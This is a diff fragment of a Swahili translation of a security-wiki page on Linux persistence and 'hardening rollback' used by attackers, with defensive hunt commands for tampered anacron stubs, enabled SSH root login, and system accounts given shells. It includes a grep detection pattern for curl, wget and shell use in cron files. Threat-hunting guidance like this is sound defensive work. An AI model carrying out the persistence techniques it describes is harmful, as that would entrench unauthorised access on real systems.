-Wavamizi mara nyingi huunganisha kujisahihisha na njia za ufikiaji zenye kudumu:
-- Cron/Anacron: mabadiliko kwa stub ya `0anacron` katika kila `/etc/cron.*/` directory kwa ajili ya utekelezaji wa mara kwa mara.
-- Tafuta:
+### Persistence na “hardening rollback” za kudumisha access (mifano ya Linux)
+Attackers mara nyingi huunganisha self-patching na njia za durable access:<sup>[[3]](#references)</sup>
+- Cron/Anacron: edits kwenye `0anacron` stub katika kila directory ya `/etc/cron.*/` kwa ajili ya periodic execution.
+- Hunt:
 ```bash
 for d in /etc/cron.*; do [ -f "$d/0anacron" ] && stat -c '%n %y %s' "$d/0anacron"; done
 grep -R --line-number -E 'curl|wget|python|/bin/sh' /etc/cron.*/* 2>/dev/null
 ```
-- Kuimarisha kurejea kwa usanidi wa SSH: kuwezesha logins za root na kubadilisha shells za kawaida kwa akaunti zenye mamlaka ya chini.
-- Tafuta kuwezesha logins za root:
+- SSH configuration hardening rollback: kuwezesha root logins na kubadilisha default shells za low-privileged accounts.
+- Hunt kwa root login enablement:
 ```bash
 grep -E '^\s*PermitRootLogin' /etc/ssh/sshd_config
-# flag values kama "yes" au mipangilio ya kupitisha kupita kiasi
+# flag values like "yes" or overly permissive settings
 ```
-- Tafuta shells za mwingiliano zenye shaka kwenye akaunti za mfumo (mfano, `games`):
+- Hunt kwa interactive shells zenye mashaka kwenye system accounts (kwa mfano, `games`):
 ```bash
 awk -F: '($7 ~ /bin\/(sh|bash|zsh)/ && $1 ~ /^(games|lp|sync|shutdown|halt|mail|operator)$/) {print}' /etc/passwd
 ```
-- Artefacts za beacon zenye majina mafupi ya bahati nasibu (herufi 8 za alfabeti) zilizotolewa kwenye diski ambazo pia zinawasiliana na C2 ya wingu:
-- Tafuta:
+- Random, short-named beacon artifacts (herufi 8 za alfabeti) zinazowekwa kwenye disk na pia kuwasiliana na cloud C2:
+- Hunt:
 ```bash
 find / -maxdepth 3 -type f -regextype posix-extended -regex '.*/[A-Za-z]{8}$' \
 -exec stat -c '%n %s %y' {} \; 2>/dev/null | sort
 ```
 
-Walinda wanapaswa kuhusisha artefacts hizi na kufichuliwa kwa nje na matukio ya kusasisha huduma ili kugundua kujirekebisha kwa kupambana na uchunguzi kutumika kuficha unyakuzi wa awali.
+Defenders wanapaswa kuhusianisha artifacts hizi na external exposure pamoja na matukio ya service patching ili kugundua anti-forensic self-remediation iliyotumiwa kuficha initial exploitation.
 
 ## References
 
-- Sophos X-Ops – “AuKill: A Weaponized Vulnerable Driver for Disabling EDR” (Machi 2023)
-https://news.sophos.com/en-us/2023/03/07/aukill-a-weaponized-vulnerable-driver-for-disabling-edr
-- Red Canary – “Patching EtwEventWrite for Stealth: Detection & Hunting” (Juni 2024)
-https://redcanary.com/blog/etw-patching-detection
-
-- [Red Canary – Patching for persistence: How DripDropper Linux malware moves through the cloud](https://redcanary.com/blog/threat-intelligence/dripdropper-linux-malware/)
-- [CVE‑2023‑46604 – Apache ActiveMQ OpenWire RCE (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)
+- [1] [Sophos X-Ops – AuKill: A Weaponized Vulnerable Driver for Disabling EDR (March 2023)](https://news.sophos.com/en-us/2023/03/07/aukill-a-weaponized-vulnerable-driver-for-disabling-edr)
+- [2] [Red Canary – Patching EtwEventWrite for Stealth: Detection & Hunting (June 2024)](https://redcanary.com/blog/etw-patching-detection)
+- [3] [Red Canary – Patching for persistence: How DripDropper Linux malware moves through the cloud](https://redcanary.com/blog/threat-intelligence/dripdropper-linux-malware/)
+- [4] [CVE‑2023‑46604 – Apache ActiveMQ OpenWire RCE (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)
 
 {{#include ../../banners/hacktricks-training.md}}
